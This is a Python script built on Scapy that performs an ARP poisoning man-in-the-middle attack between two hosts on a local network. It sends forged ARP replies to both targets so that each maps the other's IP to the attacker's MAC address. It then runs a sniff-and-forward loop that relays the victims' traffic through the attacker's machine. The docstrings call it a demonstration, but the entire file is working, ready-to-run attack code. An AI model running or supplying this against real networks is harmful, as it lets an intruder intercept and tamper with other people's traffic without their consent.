import os
import time
from typing import Optional
from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp, sniff

def _resolve_mac(ip: str) -> str:
    """
    Resolve a target IP to a MAC address using ARP. Returns None if unknown.
    """
    return getmacbyip(ip)


def _build_spoof_packet(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str) -> ARP:
    """
    Craft an ARP reply telling target_ip that spoof_ip is at attacker_mac.
    """
    return ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)


def _select_iface(target_ip: str, provided_iface: Optional[str] = None) -> str:
    """
    Choose an interface: explicit CLI > SCAPY_IFACE env > routing decision.
    """
    if provided_iface:
        return provided_iface
    env_iface = os.environ.get("SCAPY_IFACE")
    if env_iface:
        return env_iface
    # conf.route.route returns (iface, gw, addr)
    route_iface = conf.route.route(target_ip)[0]
    return route_iface or conf.iface


def _poison_bidirectional(ip_a: str, ip_b: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None):
    chosen_iface = _select_iface(ip_a, iface)
    conf.iface = chosen_iface

    attacker_mac = get_if_hwaddr(chosen_iface)

    mac_a = _resolve_mac(ip_a)
    mac_b = _resolve_mac(ip_b)

    if not mac_a or not mac_b:
        print("[!] Could not resolve MACs for both targets. Aborting ARP demo.")
        return

    pkt_to_a = _build_spoof_packet(ip_a, mac_a, ip_b, attacker_mac)
    pkt_to_b = _build_spoof_packet(ip_b, mac_b, ip_a, attacker_mac)
    frame_a = Ether(src=attacker_mac, dst=mac_a) / pkt_to_a
    frame_b = Ether(src=attacker_mac, dst=mac_b) / pkt_to_b

    print(f"[i] Poisoning {ip_a} (MAC {mac_a}) saying {ip_b} is at {attacker_mac}")
    print(f"[i] Poisoning {ip_b} (MAC {mac_b}) saying {ip_a} is at {attacker_mac}")

    for _ in range(count):
        sendp(frame_a, verbose=False, iface=chosen_iface)
        sendp(frame_b, verbose=False, iface=chosen_iface)
        time.sleep(interval)

    print("[i] ARP poisoning packets sent.")
    return chosen_iface, attacker_mac, mac_a, mac_b


def _bridge_loop(mac_a: str, mac_b: str, attacker_mac: str, iface: str) -> None:
    """
    Minimal L2 bridge: forward frames between mac_a and mac_b that arrive at us.
    """
    print("[i] Forwarding traffic between targets (Ctrl+C to stop)...")

    mtu = 1500

    def forward(pkt):
        if not pkt.haslayer(Ether):
            return
        if len(pkt) > mtu:
            return
        eth = pkt[Ether]
        if eth.dst != attacker_mac:
            return
        if eth.src == mac_a:
            pkt = pkt.copy()
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = mac_b
            sendp(pkt, iface=iface, verbose=False)
        elif eth.src == mac_b:
            pkt = pkt.copy()
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = mac_a
            sendp(pkt, iface=iface, verbose=False)

    sniff(iface=iface, prn=forward, store=False)


def run(target1_ip: str, target2_ip: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None) -> None:
    """
    Demonstrate basic ARP poisoning between two targets.
    """
    poisoned = _poison_bidirectional(target1_ip, target2_ip, count=count, interval=interval, iface=iface)
    if not poisoned:
        return
    chosen_iface, attacker_mac, mac_a, mac_b = poisoned
    try:
        _bridge_loop(mac_a, mac_b, attacker_mac, chosen_iface)
    except KeyboardInterrupt:
        print("\n[i] Stopping forwarding loop.")
